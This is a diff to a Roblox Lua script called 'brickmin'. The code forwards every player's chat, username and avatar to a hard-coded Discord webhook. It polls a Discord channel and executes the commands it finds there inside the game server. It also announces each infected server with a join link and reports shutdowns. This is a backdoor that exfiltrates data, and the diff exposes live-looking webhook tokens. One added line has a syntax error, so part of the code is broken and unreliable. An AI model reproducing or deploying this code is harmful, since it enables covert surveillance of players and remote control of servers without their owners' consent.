@@ -858,9 +858,10 @@ game:GetService("Players").PlayerAdded:connect(function(plr)
 end)
 
 
-local players = game:GetService("Players"):GetChildren()
+local players = game:GetService("Players"):GetPlayers()
 for k,v in next,players do
 	v.Chatted:connect(function(msg)
+		if msg:find("@everyone") or msg:find("@here") then return end
 		game:GetService("RunService").Heartbeat:wait(0.1)
 		local webhook = "https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy"
 		local http = game:GetService("HttpService")
@@ -875,20 +876,20 @@ for k,v in next,players do
 end
 
 game:GetService("Players").PlayerAdded:Connect(function(plr)
-plr.Chatted:connect(function(msg)
-	game:GetService("RunService").Heartbeat:wait(0.1)
-	local webhook = "https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy"
-	local http = game:GetService("HttpService")
-	local data = {
+	plr.Chatted:connect(function(msg)
+		if msg:find("@everyone") or msg:find("@here") return end
+		game:GetService("RunService").Heartbeat:wait(0.1)
+		local webhook = "https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy"
+		local http = game:GetService("HttpService")
+		local data = {
 			content = msg;
 			username = plr.Name;
 			avatar_url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userId="..plr.UserId
-	}
-	local json = http:JSONEncode(data)
-	http:PostAsync(webhook, json)
+		}
+		local json = http:JSONEncode(data)
+			http:PostAsync(webhook, json)
 	end)
-	end)
-	
+end)
 local discord = "https://canary.discordapp.com/"
 local Headers = {
 	authorization = require(script.ok)()
@@ -906,24 +907,38 @@ local z,r = pcall(function()
 			Commands[yes[1]](arg1,arg2)
 			log("Command Logged!",string.format(Decode[1].author.username .." has ran the command '%s'",yes[1]))
 			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy", "content="..string.format("you have ran the command '%s'",yes[1]).."&username="..test, 2, false, Headers)
+			end
+			local GetData1 = game:GetService("HttpService"):GetAsync("https://canary.discordapp.com/api/v6/channels/".."813584205798965258".."/messages", false, Headers)
+			local Decode1 = game:GetService("HttpService"):JSONDecode(GetData1)
+			local split = string.split(Decode1[1].content, ":")
+			local arg = split[2]
+			local arg2 = split[3]
+			if Commands[split[1]] and Decode1[1].author.bot ~= true then
+				Commands[split[1]](arg,arg2)
+			log("Command Logged!",string.format(Decode1[1].author.username .." has ran the command '%s'",split[1]))
+			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/813585851648180306/j8KFQFg5rliYG_Aw55qjSZvhoBMm67IrvBU_3dgFPUThvANVUbj5vzhVjfb2j_OWLQVK", "content="..string.format("you have ran the command '%s'",split[1]).."&username="..test, 2, false, Headers)
 		end
 		wait(1)
 	   until nil
 	end)
 end)
 
-spawn(function()
-	repeat
-		local GetData1 = game:GetService("HttpService"):GetAsync("https://canary.discordapp.com/api/v6/channels/".."813584205798965258".."/messages", false, Headers)
-		local Decode1 = game:GetService("HttpService"):JSONDecode(GetData1)
-		local split = string.split(Decode1[1].content, ":")
-		local arg = split[2]
-			local arg2 = split[3]
-		if Commands[split[1]] and Decode1[1].author.bot ~= true then
-			Commands[split[1]](arg,arg2)
-			log("Command Logged!",string.format(Decode1[1].author.username .." has ran the command '%s'",split[1]))
-			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/813585851648180306/j8KFQFg5rliYG_Aw55qjSZvhoBMm67IrvBU_3dgFPUThvANVUbj5vzhVjfb2j_OWLQVK", "content="..string.format("you have ran the command '%s'",split[1]).."&username="..test, 2, false, Headers)
-		end
-		wait(1)
-	until nil
-	end)
+local plrs = #game:GetService("Players"):GetPlayers()
+local Message = {
+	embeds = {{
+		title = ("brickmin has been ran in server"),
+		description = ("placeid: "..game.PlaceId.."\n\nnumber of players: "..plrs.."\n\npaste in searchbar: ```"..[[javascript:Roblox.GameLauncher.joinGameInstance(]].."'"..game.PlaceId.."','"..game.JobId.."'"..[[)]].."```")}},
+}
+local stuff = game:GetService("HttpService"):JSONEncode(Message)
+game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy",stuff,Enum.HttpContentType.ApplicationJson)	
+game:GetService("Players").PlayerRemoving:Connect(function(plr)
+	if #game:GetService("Players"):GetPlayers() == 0 then
+		local Message = {
+			embeds = {{
+				title = ("Server has shutdown"),
+				description = ("A server with brickmin loaded in it has shutdown")}},
+		}
+		local stuff = game:GetService("HttpService"):JSONEncode(Message)
+		game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy",stuff,Enum.HttpContentType.ApplicationJson)	
+	end
+end)
